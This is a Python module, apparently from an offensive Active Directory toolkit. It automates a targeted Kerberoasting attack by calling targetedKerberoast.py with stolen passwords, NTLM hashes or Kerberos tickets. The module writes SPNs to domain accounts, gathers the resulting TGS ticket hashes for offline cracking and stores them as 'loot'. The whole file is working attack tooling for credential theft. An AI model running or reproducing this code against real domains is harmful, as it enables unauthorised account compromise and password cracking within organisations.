# modules/writespn.py

import subprocess
import os
import re
from core.colors import red, green, yellow, blue
from core.helpers import run_command, save_loot

def attack_writespn(session):
    tool_path = os.path.join("tools", "targetedKerberoast.py")
    if not os.path.exists(tool_path):
        print(red(f"[-] Tool not found: {tool_path}"))
        print(yellow("[!] Please make sure 'targetedKerberoast.py' is in the 'tools/' directory."))
        return

    print(blue("[*] Launching targeted Kerberoast attack with SPN write..."))

    if session.hash:
        auth = f"-u '{session.username}' -p :{session.hash}"
    elif session.password:
        auth = f"-u '{session.username}' -p '{session.password}'"
    else:
        auth = f"-u '{session.username}' -k --no-pass --dc-ip {session.dc_ip} "

    output_file = "loot/Spn.hash"
    cmd = (
        f"python3 {tool_path} -v -d '{session.domain}' {auth} "
        f"-f hashcat -o {output_file}"
    )

    out, err = run_command(cmd)
    combined = out + "\n" + err

    if not os.path.exists(output_file):
        print(red("[-] No hash file created. SPN write or Kerberoast may have failed."))
        print(combined)
        return

    with open(output_file, "r") as f:
        contents = f.read().strip()

    # Check for at least one valid hash line
    hash_found = any(re.search(r"\$krb5tgs\$.*", line) for line in contents.splitlines())
    if hash_found:
        print(green(f"[+] SPN write and Kerberoast successful. Hashes saved to {output_file}"))
        save_loot("Spn.hash", contents)
    else:
        print(red("[-] SPN write may have succeeded, but no valid Kerberoast hashes found in output."))
        print(yellow("[!] Check the output manually or rerun with debug flags."))
        print(combined)
